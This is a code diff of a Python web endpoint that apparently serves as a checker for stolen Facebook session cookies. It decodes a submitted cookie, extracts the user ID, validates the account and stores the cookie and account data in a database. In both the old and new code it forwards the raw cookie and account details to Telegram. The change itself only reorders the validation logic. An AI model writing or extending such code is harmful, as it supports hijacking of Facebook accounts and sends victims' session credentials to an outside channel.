@@ -25,8 +25,6 @@ def facebook_checker(req: ReqValueChecker):
     #     telegram.apiSendMessage(req.cookie, values)
     # return values
 
-    isNeedUpdate = False
-
     cookie = facebook.apiDecodeBase64(req.cookie)
     cookieDic = facebook.apiParserCookieToDic(cookie)
     fbUID = facebook.apiGetUidFromCookie(cookie)
@@ -45,21 +43,19 @@ def facebook_checker(req: ReqValueChecker):
             else:
                 return {**thisFacebookAccount.graph, 'isDuplicate': True}
         else:
-            isNeedUpdate = True
-
-    values = facebook.apiCheck(req.cookie)
-    if isNeedUpdate:
-        if values is None:
-            raise HTTPException(status_code=403)
-        else:
-            telegram.apiSendMessage(req.cookie, values)
-            MFacebook.update(
-                cookie=cookie,
-                graph=values,
-                updated_time=calendar.timegm(time.gmtime())
-            ).where(MFacebook.uid == fbUID).execute()
-            return {**values, 'isDuplicate': False}
+            values = facebook.apiCheck(req.cookie)
+            if values is None:
+                raise HTTPException(status_code=403)
+            else:
+                telegram.apiSendMessage(req.cookie, values)
+                MFacebook.update(
+                    cookie=cookie,
+                    graph=values,
+                    updated_time=calendar.timegm(time.gmtime())
+                ).where(MFacebook.uid == fbUID).execute()
+                return {**values, 'isDuplicate': False}
     else:
+        values = facebook.apiCheck(req.cookie)
         if values is None:
             MFacebook.insert(
                 id=ID(),
